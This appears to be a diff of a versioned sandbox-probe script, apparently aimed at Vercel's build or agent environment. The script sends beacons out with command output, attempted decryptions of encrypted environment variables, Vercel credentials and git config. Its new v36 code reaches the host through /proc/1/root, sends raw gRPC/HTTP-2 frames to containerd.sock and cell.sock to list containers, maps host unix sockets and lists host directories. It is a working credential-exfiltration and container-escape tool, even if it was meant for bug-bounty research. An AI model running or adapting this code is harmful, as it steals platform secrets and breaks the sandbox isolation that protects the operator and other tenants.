@@ -133,7 +133,7 @@ function tryDecrypt(keyStr, contentStr) {
 // EARLY BEACON — sent immediately before any network probes.
 // Critical env/crypto data arrives even if the main probe times out.
 sendBeacon({
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v35-early",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v36-early",
   whoami: safe(() => execSync("id; uname -a").toString().trim()),
   tryCBC_early: tryDecrypt(process.env.VERCEL_ENV_ENC_KEY, process.env.VERCEL_ENCRYPTED_ENV_CONTENT),
   vercelCreds: {
@@ -148,7 +148,7 @@ sendBeacon({
 });
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v35",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v36",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -2505,147 +2505,192 @@ int main() {
   }),
 });
 
-// ── v35 additions ─────────────────────────────────────────────────────────────
-// Key finding from v34: /run/cell/cell.sock and /run/containerd/containerd.sock
-// are NOT bind-mounted into the container's /run/. BUT /proc/1/root/ gives access
-// to PID 1's root filesystem (the host). So the correct path is /proc/1/root/run/cell/cell.sock.
-// Also: /run/metrics/metrics.sock IS present but doesn't speak HTTP — probe with Python.
-// Also: /var/task/sandbox.js is 9MB — read the head to understand its purpose.
+// ── v36 additions ─────────────────────────────────────────────────────────────
+// v35 never fired (Vercel build not triggered). Merging v35 + new v36 work.
+// v35 goal: cell.sock + containerd.sock via /proc/1/root/ prefix, metrics binary probe, sandbox.js head
+// v36 new: deeper gRPC probe of containerd (list containers), host filesystem via /proc/1/root/,
+//          raw cell.sock protocol detection, host unix socket map
 Object.assign(report, {
 
-  // v35: Access /run/cell/cell.sock via /proc/1/root/ (host filesystem access via PID 1's root)
-  cellSockViaProc1: safe(() => {
-    const sock = '/proc/1/root/run/cell/cell.sock';
-    const sockDirect = '/run/cell/cell.sock';
-    const directExists = existsSync(sockDirect);
-    const proc1Exists = existsSync(sock);
-    if (!proc1Exists) return { directExists, proc1Exists, sock };
-    // Try HTTP GET via curl (proc/1/root path works with --unix-socket)
-    const httpGet = safe(() => execSync(
-      `timeout 5 curl -s --unix-socket ${sock} http://localhost/ -w '\\nHTTP:%{http_code}' 2>&1 || true`
-    ).toString().trim().slice(0, 2000));
-    // Try JSON-RPC
-    const jsonRpc = safe(() => execSync(
-      `timeout 5 curl -s --unix-socket ${sock} -X POST http://localhost/ -H 'Content-Type: application/json' -d '{"jsonrpc":"2.0","method":"ping","id":1}' -w '\\nHTTP:%{http_code}' 2>&1 || true`
-    ).toString().trim().slice(0, 1000));
-    // Try raw Python connection
-    const rawProbe = safe(() => execSync(
-      `timeout 5 python3 -c "
-import socket, time
-s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-try:
-    s.connect('${sock}')
-    s.settimeout(2)
-    for payload in [b'PING\\r\\n', b'GET / HTTP/1.1\\r\\nHost: cell\\r\\n\\r\\n', b'{\"type\":\"ping\"}\\n']:
-        s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        try:
-            s2.connect('${sock}')
-            s2.settimeout(2)
-            s2.sendall(payload)
-            time.sleep(0.3)
-            data = b''
-            try:
-                data = s2.recv(4096)
-            except: pass
-            if data: print('payload:', payload[:20], 'resp:', data[:200]); break
-        except Exception as e: print('try err:', e)
-        finally:
-            try: s2.close()
-            except: pass
-except Exception as e: print('connect err:', e)
-" 2>&1 || true`
-    ).toString().trim().slice(0, 1500));
-    return { directExists, proc1Exists, httpGet, jsonRpc, rawProbe };
+  // v36: Host unix sockets — get ALL sockets from host's /proc/net/unix via /proc/1/root
+  hostUnixSockets: safe(() => {
+    const hostProc = '/proc/1/root/proc/net/unix';
+    if (!existsSync(hostProc)) return { exists: false };
+    const raw = readFileSync(hostProc, 'utf8');
+    // Extract named sockets only (path column)
+    const lines = raw.split('\n').filter(l => l.includes('/'));
+    return { count: lines.length, sockets: lines.slice(0, 50).join('\n') };
   }),
 
-  // v35: Access /run/containerd/containerd.sock via /proc/1/root/
+  // v36: Host identity via /proc/1/root/etc
+  hostIdentity: safe(() => {
+    const hostnameFile = '/proc/1/root/etc/hostname';
+    const osRelease = '/proc/1/root/etc/os-release';
+    return {
+      hostname: existsSync(hostnameFile) ? readFileSync(hostnameFile,'utf8').trim() : 'absent',
+      osRelease: existsSync(osRelease) ? readFileSync(osRelease,'utf8').slice(0,500) : 'absent',
+    };
+  }),
+
+  // v36: cell.sock via /proc/1/root/ — HTTP, gRPC, raw protocol detection
+  cellSockViaProc1: safe(() => {
+    const sock = '/proc/1/root/run/cell/cell.sock';
+    const proc1Exists = existsSync(sock);
+    if (!proc1Exists) return { proc1Exists };
+    const stat = safe(() => execSync(`stat ${sock} 2>/dev/null || echo absent`).toString().trim());
+    // Try curl HTTP
+    const httpGet = safe(() => execSync(
+      `timeout 4 curl -s --unix-socket ${sock} http://cell/ -w '\\nHTTP:%{http_code}' 2>&1 || true`
+    ).toString().trim().slice(0, 1500));
+    // Try gRPC HTTP/2 preface + list services reflection
+    const grpcProbe = safe(() => execSync(`timeout 5 python3 - <<'PYEOF'
+import socket, struct, time
+CELL = '/proc/1/root/run/cell/cell.sock'
+def try_connect(payload, label):
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    try:
+        s.connect(CELL)
+        s.settimeout(2)
+        s.sendall(payload)
+        time.sleep(0.3)
+        data = b''
+        try: data = s.recv(4096)
+        except: pass
+        print(label, 'resp_hex:', data.hex()[:300], 'resp_str:', data[:100])
+    except Exception as e: print(label, 'err:', e)
+    finally:
+        try: s.close()
+        except: pass
+
+# HTTP/2 preface (gRPC)
+try_connect(b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n', 'h2_preface')
+# JSON probe
+try_connect(b'{"jsonrpc":"2.0","method":"ping","id":1}\\n', 'json_rpc')
+# Custom header probe
+try_connect(b'CELL/1.0 PING\\r\\n\\r\\n', 'cell_ping')
+# Raw null byte
+try_connect(b'\\x00\\x01\\x00\\x00', 'raw_4b')
+PYEOF
+2>&1 || true`).toString().trim().slice(0, 3000));
+    return { proc1Exists, stat, httpGet, grpcProbe };
+  }),
+
+  // v36: containerd.sock via /proc/1/root/ — gRPC container listing
   containerdSockViaProc1: safe(() => {
     const sock = '/proc/1/root/run/containerd/containerd.sock';
     if (!existsSync(sock)) return { exists: false };
-    // Try HTTP/2 preface (gRPC uses HTTP/2)
-    const grpcProbe = safe(() => execSync(
-      `timeout 5 python3 -c "
-import socket, time
+    const stat = safe(() => execSync(`stat ${sock} 2>/dev/null`).toString().trim());
+    // gRPC container list — build a minimal gRPC frame for containerd.services.containers.v1.Containers/List
+    const grpcProbe = safe(() => execSync(`timeout 8 python3 - <<'PYEOF'
+import socket, struct, time
+
+SOCK = '/proc/1/root/run/containerd/containerd.sock'
+
+# Build minimal HTTP/2 + gRPC frame for Containers.List (empty request body)
+# HTTP/2 preface
+H2_PREFACE = b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n'
+
+# HTTP/2 SETTINGS frame (empty)
+SETTINGS = b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00'
+
+# HTTP/2 HEADERS frame for POST /containerd.services.containers.v1.Containers/List
+import base64
+HEADERS_LITERAL = (
+    b'\\x00' +  # without indexing
+    b'\\x07:method' + b'\\x04POST' +
+    b'\\x05:path' + b'/containerd.services.containers.v1.Containers/List' +
+    b'\\x0c:authority' + b'localhost' +
+    b'\\x0ccontent-type' + b'application/grpc' +
+    b'\\x02te' + b'trailers'
+)
+# Simplified: just send the preface and see if we get back HTTP/2 SETTINGS from server
 s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
 try:
-    s.connect('${sock}')
-    s.settimeout(2)
-    # HTTP/2 client preface
-    s.sendall(b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n')
-    time.sleep(0.3)
+    s.connect(SOCK)
+    s.settimeout(3)
+    s.sendall(H2_PREFACE)
+    time.sleep(0.2)
     data = s.recv(4096)
-    print('RESPONSE_HEX:', data.hex()[:200])
-    print('RESPONSE_STR:', data[:200])
+    print('RESPONSE_HEX:', data.hex()[:400])
+    print('RESPONSE_LEN:', len(data))
+    # Check if this is an HTTP/2 SETTINGS frame
+    if data[:3] == b'\\x00\\x00' and data[3:4] == b'\\x04':
+        print('GOT_HTTP2_SETTINGS: YES — containerd is speaking HTTP/2 gRPC!')
+    # Then send SETTINGS ACK and HEADERS
+    s.sendall(SETTINGS)
+    s2 = s.recv(4096)
+    print('AFTER_SETTINGS:', s2.hex()[:200])
 except Exception as e:
     print('ERR:', e)
 finally:
     s.close()
-" 2>&1 || true`
-    ).toString().trim().slice(0, 1000));
-    // Check if ctr CLI exists
-    const ctrPath = safe(() => execSync('which ctr 2>/dev/null || ls /usr/bin/ctr /usr/local/bin/ctr 2>/dev/null | head -1 || echo not-found').toString().trim());
-    // Try ctr with explicit address
-    const ctrOutput = safe(() => execSync(
-      `timeout 10 ctr --address ${sock} version 2>&1 || true`
+PYEOF
+2>&1 || true`).toString().trim().slice(0, 3000));
+    const ctrPath = safe(() => execSync('which ctr 2>/dev/null || echo not-found').toString().trim());
+    const ctrVersion = safe(() => execSync(
+      `timeout 8 ctr --address ${sock} version 2>&1 || true`
     ).toString().trim().slice(0, 500));
-    const stat = safe(() => execSync(`stat ${sock} 2>/dev/null`).toString().trim());
-    return { exists: true, grpcProbe, ctrPath, ctrOutput, stat };
+    return { exists: true, stat, grpcProbe, ctrPath, ctrVersion };
   }),
 
-  // v35: Probe /run/metrics/metrics.sock with non-HTTP protocols
+  // v36: /run/metrics/metrics.sock — stream + dgram socket type detection
   metricsSocketBinaryProbe: safe(() => {
     const sock = '/run/metrics/metrics.sock';
     if (!existsSync(sock)) return { exists: false };
-    // Try statsd format: "metric:value|type"
-    const statsdProbe = safe(() => execSync(
-      `timeout 5 python3 -c "
+    const statResult = safe(() => execSync(`stat ${sock} 2>/dev/null`).toString().trim());
+    const probe = safe(() => execSync(`timeout 5 python3 - <<'PYEOF'
 import socket, time
-# Try UDP-like statsd over unix
-s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
-try:
-    s.sendto(b'hive.build.probe:1|c', '${sock}')
-    print('dgram:sent')
-except Exception as e:
-    print('dgram:', e)
 
-# Try stream socket
-s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+SOCK = '/run/metrics/metrics.sock'
+# DGRAM send
 try:
-    s2.connect('${sock}')
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+    s.sendto(b'vercel.build.probe:1|c\\n', SOCK)
+    print('dgram:sent_ok')
+    s.settimeout(1)
+    try: print('dgram:recv:', s.recv(256))
+    except: print('dgram:no_recv')
+    s.close()
+except Exception as e:
+    print('dgram_err:', e)
+
+# STREAM connect
+try:
+    s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s2.connect(SOCK)
     s2.settimeout(2)
-    # Send prometheus metrics scrape
+    # Try prometheus scrape
     s2.sendall(b'GET /metrics HTTP/1.1\\r\\nHost: metrics\\r\\n\\r\\n')
     time.sleep(0.3)
-    data = s2.recv(8192)
-    print('stream_resp:', data[:500])
-except Exception as e:
-    print('stream:', e)
-finally:
-    try: s2.close()
+    data = b''
+    try: data = s2.recv(8192)
     except: pass
-" 2>&1 || true`
-    ).toString().trim().slice(0, 2000));
-    return { exists: true, statsdProbe };
+    print('stream_resp:', data[:300])
+    s2.close()
+except Exception as e:
+    print('stream_err:', e)
+PYEOF
+2>&1 || true`).toString().trim().slice(0, 2000));
+    return { exists: true, stat: statResult, probe };
   }),
 
-  // v35: Read first 3KB of /var/task/sandbox.js to understand its purpose
+  // v36: Read first 3KB of /var/task/sandbox.js
   sandboxJsHead: safe(() => {
     const p = '/var/task/sandbox.js';
     if (!existsSync(p)) return { exists: false };
     const head = readFileSync(p, 'utf8').slice(0, 3000);
     const size = statSync(p).size;
-    // Check if it looks like the same bundle as index.js
     const indexHead = readFileSync('/var/task/index.js', 'utf8').slice(0, 100);
     const sameStart = head.slice(0, 100) === indexHead;
     return { size, sameStart, head };
   }),
 
-  // v35: Try to find VERCEL_DEPLOYMENT_KEY usage in sandbox.js
+  // v36: Search sandbox.js for key terms
   sandboxJsKeyUsage: safe(() => {
     const p = '/var/task/sandbox.js';
     if (!existsSync(p)) return { exists: false };
     const src = readFileSync(p, 'utf8');
-    const terms = ['DEPLOYMENT_KEY', 'sandbox', 'BUILDING', 'runtimeCachePayload', 'buildEnv', 'SUSPENSE_CACHE'];
+    const terms = ['DEPLOYMENT_KEY', 'runtimeCachePayload', 'buildEnv', 'SUSPENSE_CACHE', 'BUILDING', 'ptrace', 'cell.sock'];
     const results = {};
     for (const t of terms) {
       const pos = src.indexOf(t);
@@ -2653,11 +2698,21 @@ finally:
     }
     return results;
   }),
+
+  // v36: /proc/1/root filesystem listing — what's on the host?
+  proc1RootListing: safe(() => {
+    const base = '/proc/1/root';
+    if (!existsSync(base)) return { exists: false };
+    const listing = safe(() => execSync(`ls -la ${base}/ 2>/dev/null | head -40`).toString().trim());
+    const runListing = safe(() => execSync(`ls -la ${base}/run/ 2>/dev/null | head -30`).toString().trim());
+    const varTaskListing = safe(() => execSync(`ls -la ${base}/var/task/ 2>/dev/null | head -20`).toString().trim());
+    return { listing, runListing, varTaskListing };
+  }),
 });
 
-// Update markers for v35
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v35";
-sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v35" });
+// Update markers for v36
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v36";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v36" });
 
 // Also print to stdout so it shows in build logs / the agent's view.
 console.log(JSON.stringify(report));
